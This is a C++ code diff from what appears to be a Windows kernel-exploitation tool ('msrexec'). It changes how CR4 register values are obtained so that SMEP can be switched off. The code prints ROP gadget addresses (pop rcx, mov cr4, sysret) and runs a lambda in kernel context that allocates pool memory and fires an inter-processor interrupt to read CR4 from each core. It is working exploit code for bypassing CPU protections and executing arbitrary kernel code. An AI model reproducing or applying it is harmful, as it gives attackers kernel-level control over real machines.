@@ -22,6 +22,91 @@ namespace vdm
 			if (!find_globals())
 				std::printf("> failed to find globals...\n");
 
+		// guess CR4 value for now... 
+		// later on I get real cr4 value from IPI...
+		const auto cr4_value = guess_cr4_value();
+
+		m_smep_on.flags = cr4_value.flags;
+		m_smep_off.flags = cr4_value.flags;
+		m_smep_off.smep_enable = false;
+
+		ntoskrnl_base = 
+			reinterpret_cast<void*>(
+				utils::kmodule::get_base("ntoskrnl.exe"));
+
+		get_system_routine =
+			reinterpret_cast<get_system_routine_t>(
+				utils::kmodule::get_export(
+					"ntoskrnl.exe", "RtlFindExportedRoutineByName"));
+
+		// debug prints...
+		std::printf("> m_pop_rcx_gadget -> 0x%p\n", m_pop_rcx_gadget);
+		std::printf("> m_mov_cr4_gadget -> 0x%p\n", m_mov_cr4_gadget);
+		std::printf("> m_sysret_gadget -> 0x%p\n", m_sysret_gadget);
+		std::printf("> m_kpcr_rsp_offset -> 0x%x\n", m_kpcr_rsp_offset);
+		std::printf("> m_kpcr_krsp_offset -> 0x%x\n", m_kpcr_krsp_offset);
+		std::printf("> m_system_call -> 0x%p\n", m_system_call);
+		std::printf("> m_smep_off -> 0x%p\n", m_smep_off.flags);
+		std::printf("> m_smep_on -> 0x%p\n", m_smep_on.flags);
+		std::printf("> check to make sure none of these^ are zero before pressing enter...\n");
+		std::getchar();
+
+		// when this returns back to UM, CR4 will still potentially contain invalid bits...
+		this->exec
+		(
+			// grab the actual CR4 value from other cores by firing an IPI...
+			[&](void* krnl_base, get_system_routine_t get_kroutine) -> void
+			{
+				_ipi_data ipi_data;
+				cpuid_eax_01 cpuid_info;
+				__cpuid((int*)&cpuid_info, 1);
+
+				const auto cpuid_num =
+					cpuid_info
+						.cpuid_additional_information
+						.initial_apic_id;
+
+				ipi_data.core_num = cpuid_num;
+
+				const auto ex_alloc = 
+					reinterpret_cast<ex_alloc_t>(
+						get_kroutine(krnl_base, "ExAllocatePool"));
+
+				const auto ex_free = 
+					reinterpret_cast<ex_free_t>(
+						get_kroutine(krnl_base, "ExFreePool"));
+
+				const auto ipi_call = 
+					reinterpret_cast<ipi_call_t>(
+						get_kroutine(krnl_base, "KeIpiGenericCall"));
+
+				const auto ipi_callback_buf =
+					ex_alloc(NULL, sizeof ipi_callback);
+				
+				memcpy(ipi_callback_buf, ipi_callback, sizeof ipi_callback);
+
+				// please note that &ipi_data will be a 
+				// pointer to the *kernel stack* so its globally mapped...
+				ipi_call(ipi_callback_buf, &ipi_data);
+
+				// fix m_smep_on and m_smep_off values now...
+				m_smep_on.flags = ipi_data.cr4_val;
+				m_smep_off.flags = ipi_data.cr4_val;
+				m_smep_off.smep_enable = false;
+
+				// free ipi_callback buffer and return from syscall...
+				memset(ipi_callback_buf, NULL, sizeof ipi_call);
+				ex_free(ipi_callback_buf);
+			}
+		);
+
+		// restore CR4 values so that they are correct 
+		// (syscall handler from last exec hasnt updated CR4 with corrected m_smep_off/m_smep_on)...
+		this->exec([&](void* krnl_base, get_system_routine_t get_kroutine) -> void{});
+	}
+
+	auto msrexec_ctx::guess_cr4_value() -> cr4
+	{
 		cpuid_eax_01 cpuid_info;
 		__cpuid((int*)&cpuid_info, 1);
 
@@ -49,39 +134,9 @@ namespace vdm
 
 		cr4_value.pcid_enable =
 			cpuid_info.cpuid_feature_information_ecx
-				.process_context_identifiers;
+			.process_context_identifiers;
 
-		m_smep_off.flags = cr4_value.flags;
-		m_smep_off.smep_enable = false;
-		m_smep_off.smap_enable = false; // newer cpus have this on...
-
-		// WARNING: some virtual machines dont have SMEP...
-		// my VMWare VM doesnt... nor does my Virtual Box VM...
-		m_smep_on.flags = cr4_value.flags;
-		m_smep_on.smep_enable = cpuid_features.ebx.smep;
-		m_smep_on.smap_enable = cpuid_features.ebx.smap;
-
-		ntoskrnl_base = 
-			reinterpret_cast<void*>(
-				utils::kmodule::get_base("ntoskrnl.exe"));
-
-		get_system_routine =
-			reinterpret_cast<get_system_routine_t>(
-				utils::kmodule::get_export(
-					"ntoskrnl.exe", "RtlFindExportedRoutineByName"));
-
-		std::printf("> m_pop_rcx_gadget -> 0x%p\n", m_pop_rcx_gadget);
-		std::printf("> m_mov_cr4_gadget -> 0x%p\n", m_mov_cr4_gadget);
-		std::printf("> m_sysret_gadget -> 0x%p\n", m_sysret_gadget);
-		std::printf("> m_kpcr_rsp_offset -> 0x%x\n", m_kpcr_rsp_offset);
-		std::printf("> m_kpcr_krsp_offset -> 0x%x\n", m_kpcr_krsp_offset);
-		std::printf("> m_system_call -> 0x%p\n", m_system_call);
-
-		std::printf("> m_smep_off -> 0x%p\n", m_smep_off.flags);
-		std::printf("> m_smep_on -> 0x%p\n", m_smep_on.flags);
-
-		std::printf("> check to make sure none of these^ are zero before pressing enter...\n");
-		std::getchar();
+		return cr4_value;
 	}
 
 	auto msrexec_ctx::find_gadgets() -> bool
